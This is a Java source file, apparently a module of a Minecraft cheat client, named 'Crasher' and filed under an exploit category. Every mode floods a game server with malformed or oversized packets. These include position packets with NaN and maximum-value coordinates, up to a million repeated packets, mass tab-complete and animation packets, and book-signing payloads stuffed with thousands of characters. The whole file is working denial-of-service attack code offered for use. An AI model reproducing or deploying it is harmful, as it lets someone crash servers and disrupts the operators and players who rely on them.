package lime.features.module.impl.exploit;

import io.netty.buffer.Unpooled;
import lime.core.events.EventTarget;
import lime.core.events.impl.EventUpdate;
import lime.features.module.Category;
import lime.features.module.Module;
import lime.features.setting.impl.EnumValue;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.network.play.client.C14PacketTabComplete;
import net.minecraft.network.play.client.C17PacketCustomPayload;

public class Crasher extends Module {
    public Crasher() {
        super("Crasher", Category.EXPLOIT);
    }

    private final EnumValue mode = new EnumValue("Mode", this, "PosLook", "PosLook", "PosLook2", "Pos", "TabComplete", "Animation", "Book", "GroundPacket");

    @EventTarget
    public void onUpdate(EventUpdate e) {
        switch (mode.getSelected().toLowerCase()) {
            case "poslook":
                for (int i = 0; i < 30000; i++) {
                    mc.thePlayer.sendQueue.addToSendQueue(
                            new C03PacketPlayer.C04PacketPlayerPosition(Double.NaN, Double.NaN, Double.NaN, Boolean.TRUE));
                    mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Double.MAX_VALUE,
                            Double.NaN, Double.MAX_VALUE, Boolean.TRUE));
                }
                this.toggle();
                break;
            case "poslook2":
                int x = 1;
                int y = 1;
                int z = 1;
                for (int i = 0; i < 30000; i++) {
                    x += 999 * Math.random();
                    z += 999 * Math.random();
                    y += mc.thePlayer.motionY;

                    mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C06PacketPlayerPosLook(x, y, z,
                            (float) (mc.thePlayer.rotationYaw + Math.random()),
                            (float) (mc.thePlayer.rotationPitch + Math.random()), false));
                }
                this.toggle();
                break;
            case "pos":
                for (int i = 0; i < 1000000; i++) {
                    mc.thePlayer.sendQueue.addToSendQueue(
                            new C03PacketPlayer.C04PacketPlayerPosition(Double.NaN, Double.NaN, Double.NaN, Boolean.TRUE));
                    mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Double.MAX_VALUE,
                            Double.MIN_VALUE, Double.MAX_VALUE, Boolean.TRUE));
                }
                this.toggle();
                break;
            case "tabcomplete":
                for (int i = 0; i < 30000; i++) {
                    mc.thePlayer.sendQueue.addToSendQueue(new C14PacketTabComplete("/"));
                }
                this.toggle();
                break;
            case "animation":
                for (int i = 0; i < 30000; i++) {
                    mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
                }
                this.toggle();
                break;
            case "book":
                PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
                ItemStack item = new ItemStack(Item.getItemById(386));
                NBTTagList pages = new NBTTagList();
                item.setTagInfo("author", new NBTTagString("xd"));
                item.setTagInfo("title", new NBTTagString("xd"));
                item.setTagInfo("pages", pages);
                for (int i = 0; i < 15; i++)
                {
                    StringBuilder sb = new StringBuilder();
                    for (int j = 0; j < 1000; j++) {
                        sb.append("xd");
                    }
                    pages.appendTag(new NBTTagString(sb.toString()));
                }
                packetbuffer.writeItemStackToBuffer(item);
                for (int i = 0; i < 1000; i++)
                {
                    C17PacketCustomPayload customPayload = new C17PacketCustomPayload("MC|BSign", packetbuffer);
                    mc.thePlayer.sendQueue.addToSendQueue(customPayload);
                }
                try
                {
                    Thread.sleep(1500L);
                }
                catch (Throwable localThrowable) {}
                break;
            case "groundpacket":
                for(int i = 0; i < 1000; i++) {
                    for (int ez = 0; ez < 30000; ++ez) {
                        mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer());
                    }
                }
                this.toggle();
                break;
        }
    }
}
